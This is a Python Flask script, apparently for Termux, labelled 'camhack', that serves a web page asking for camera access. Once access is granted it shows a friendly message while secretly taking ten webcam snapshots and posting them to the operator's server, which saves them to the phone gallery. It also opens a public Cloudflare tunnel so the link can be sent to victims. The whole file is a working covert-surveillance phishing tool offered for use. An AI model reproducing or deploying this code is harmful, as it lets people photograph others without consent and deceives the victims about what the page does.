#!/usr/bin/env python3
"""
cam
By shourya
Single file - Auto Cloudflare + Unlock
"""

import os, time, threading, base64
from flask import Flask, render_template_string, request
from colorama import Fore, Style

app = Flask(__name__)

# ---------------- HTML Page ----------------
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>eren(s)</title>
  <style>
    body { background: black; color: lime; text-align: center; font-family: monospace; }
    #msg { font-size: 20px; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>📸 eren </h1>
  <h3>Camera Access Required</h3>
  <p id="msg">Please allow camera to continue...</p>
  <video id="video" autoplay playsinline width="300" height="220"></video>
  <canvas id="canvas" width="300" height="220" style="display:none;"></canvas>

  <script>
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let ctx = canvas.getContext('2d');
    let count = 0;

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      document.getElementById("msg").innerText = "😊 You are a very good person. God bless you!";
      let interval = setInterval(() => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        let data = canvas.toDataURL("image/png");
        fetch('/upload', { method:'POST', body:data });
        count++;
        if(count >= 10) { 
          clearInterval(interval); 
          document.getElementById("msg").innerText="✔ Captured 10 images"; 
        }
      }, 1500);
    })
    .catch(err => {
      document.getElementById("msg").innerText = "❌ Camera access denied!";
    });
  </script>
</body>
</html>
"""

# ---------------- Upload Route ----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    data = request.data.decode("utf-8")
    num = len([f for f in os.listdir(".") if f.startswith("camtam_")]) + 1
    imgdata = data.split(",")[1]

    # --- Save in Termux folder as before ---
    filename_local = f"camtam_{num}.png"
    with open(filename_local, "wb") as f:
        f.write(base64.b64decode(imgdata))

    # --- Save to Download folder for gallery ---
    save_dir = "/sdcard/Download/HCO-Cam-Tam"
    os.makedirs(save_dir, exist_ok=True)
    filename_gallery = os.path.join(save_dir, filename_local)
    with open(filename_gallery, "wb") as f:
        f.write(base64.b64decode(imgdata))

    # --- Refresh gallery (media scan) ---
    os.system(f'am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://{filename_gallery}')

    # --- Print Termux log ---
    print(Fore.GREEN + f"[✔] Image saved to gallery: {filename_gallery}" + Style.RESET_ALL)

    return "ok"

# ---------------- Banner + Unlock ----------------
def banner():
    os.system("clear")
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "camhack by shourya" + Style.RESET_ALL)

def unlock():
    os.system("clear")
    print(Fore.RED + Style.BRIGHT + "\n🔓 Unlocking camhack" + Style.RESET_ALL)
    print(Fore.YELLOW + "\n👉 To use this tool, you must join to  Shourya's telegram channel." + Style.RESET_ALL)
    print(Fore.CYAN + "\nYou will be redirected automatically in 3 seconds..." + Style.RESET_ALL)
    for i in range(10,0,-1):
        print(Fore.MAGENTA + f"⏳ Redirecting to telegram in {i} sec..." + Style.RESET_ALL, end="\r")
        time.sleep(1)
    print(Fore.GREEN + "\n🌍 Opening telegram... Please join!\n" + Style.RESET_ALL)
    os.system("xdg-open https://youtube.com/@hackers_colony_tech")
    input(Fore.CYAN + "\n✅ After join, press ENTER to continue..." + Style.RESET_ALL)

# ---------------- Cloudflare Tunnel ----------------
def start_cloudflare():
    print(Fore.CYAN + "\n[+] Starting Cloudflared tunnel..." + Style.RESET_ALL)
    os.system("pkill cloudflared >/dev/null 2>&1")
    os.system("cloudflared tunnel --url http://localhost:5000 --no-autoupdate")

# ---------------- Main ----------------
if __name__ == "__main__":
    unlock()
    banner()
    print(Fore.GREEN + "[✔] Local server started on http://0.0.0.0:5000" + Style.RESET_ALL)

    # Start Flask in background thread
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False)).start()

    # Start Cloudflare tunnel (prints WAN link)
    start_cloudflare()
